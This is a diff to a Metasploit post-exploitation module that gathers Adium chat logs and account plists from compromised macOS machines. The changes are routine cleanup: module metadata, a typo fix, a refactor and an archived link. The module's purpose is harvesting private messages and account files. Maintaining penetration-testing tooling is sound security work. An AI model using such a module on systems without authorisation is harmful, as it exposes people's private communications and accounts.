@@ -30,7 +30,12 @@ class MetasploitModule < Msf::Post
           ['CHATS', { 'Description' => 'Collect chat logs with a pattern' } ],
           ['ALL', { 'Description' => 'Collect both account plists and chat logs' }]
         ],
-        'DefaultAction' => 'ALL'
+        'DefaultAction' => 'ALL',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [ARTIFACTS_ON_DISK],
+          'Reliability' => []
+        }
       )
     )
 
@@ -43,12 +48,11 @@ class MetasploitModule < Msf::Post
 
   #
   # Parse a plst file to XML format:
-  # http://hints.macworld.com/article.php?story=20050430105126392
+  # https://web.archive.org/web/20141112034745/http://hints.macworld.com/article.php?story=20050430105126392
   #
   def plutil(filename)
     exec("plutil -convert xml1 #{filename}")
-    data = exec("cat #{filename}")
-    return data
+    exec("cat #{filename}")
   end
 
   #
@@ -148,7 +152,7 @@ class MetasploitModule < Msf::Post
       # Save data, and then clean up
       #
       if xml.empty?
-        print_error("#{@peer} - Unalbe to parse: #{file}")
+        print_error("#{@peer} - Unable to parse: #{file}")
       else
         loot << { filename: file, data: xml }
         exec("rm #{rand_name}")
@@ -220,7 +224,7 @@ class MetasploitModule < Msf::Post
   # and retry under certain conditions.
   #
   def exec(cmd)
-    out = cmd_exec(cmd).chomp
+    cmd_exec(cmd).chomp
   rescue ::Timeout::Error => e
     vprint_error("#{@peer} - #{e.message} - retrying...")
     retry
@@ -260,16 +264,17 @@ class MetasploitModule < Msf::Post
 
     #
     # Check adium.  And then set the default profile path
+    # Example: /Users/[username]/Library/Application Support/Adium 2.0/
     #
     base = "/Users/#{user}/Library/Application\\ Support/"
     adium_path = locate_adium(base)
-    if adium_path
-      print_status("#{@peer} - Found adium: #{adium_path}")
-      adium_path += 'Users/Default/'
-    else
+    unless adium_path
       print_error("#{@peer} - Unable to find adium, will not continue")
       return
     end
+
+    print_status("#{@peer} - Found adium: #{adium_path}")
+    adium_path += 'Users/Default/'
 
     #
     # Now that adium is found, let's download some stuff
@@ -284,8 +289,3 @@ class MetasploitModule < Msf::Post
     save(:chatlogs, chatlogs) if !chatlogs.nil? && !chatlogs.empty?
   end
 end
-
-=begin
-Adium:
-/Users/[username]/Library/Application\ Support/Adium\ 2.0/
-=end
